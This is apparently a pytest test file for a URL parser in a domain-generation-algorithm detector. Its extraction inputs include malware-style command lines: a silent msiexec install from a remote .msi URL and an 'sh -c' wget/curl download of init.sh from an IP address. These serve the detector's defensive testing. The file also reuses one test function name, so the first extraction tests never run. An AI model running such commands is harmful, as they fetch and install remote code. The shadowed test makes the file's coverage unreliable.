import pytest

from dga_detector.urlparser import get_urls_from_text, is_valid_url


@pytest.mark.parametrize(
    "url, expected",
    [
        ("http://www.google.com", True),
        ("google.com", True),
        ("https://www.google.com/maps", True),
        ("http://test", False),
        ("192.168.1.100", False),
    ],
)
def test_is_valid_url(url, expected):
    assert is_valid_url(url) == expected


@pytest.mark.parametrize(
    "text, expected_urls",
    [
        ("somedomain.com", ["somedomain.com"]),
        ("Check out this website: https://www.example.com ", ["www.example.com"]),
        (
            "Some text https://www.example1.com more text http://www.example2.com",
            ["www.example1.com", "www.example2.com"],
        ),
        (
            '"C:\Windows\System32\msiexec.exe" /qn /i http://newdomain.asdasd.com/KB4054519.msi',
            ["newdomain.asdasd.com"],
        ),
    ],
)
def test_get_urls_from_text(text, expected_urls):
    actual = get_urls_from_text(text)

    assert len(actual) == len(expected_urls)
    for url in get_urls_from_text(text):
        assert url in expected_urls


@pytest.mark.parametrize(
    "text",
    [
        ("No url here -Force;cpi"),
        (
            "IP addres is not a domain name sh -c 'wget -q http://123.45.67.8/init.sh || curl -s -O -f http://123.45.67.8/init.sh 2>&1 3>&1'"
        ),
        (r"\"C:\Users\SOMEUSER~1\AppData\Local\Temp\jdcsdfsdfrg3qi27kz81.tmp\""),
    ],
)
def test_get_urls_from_text(text):
    assert get_urls_from_text(text) == []
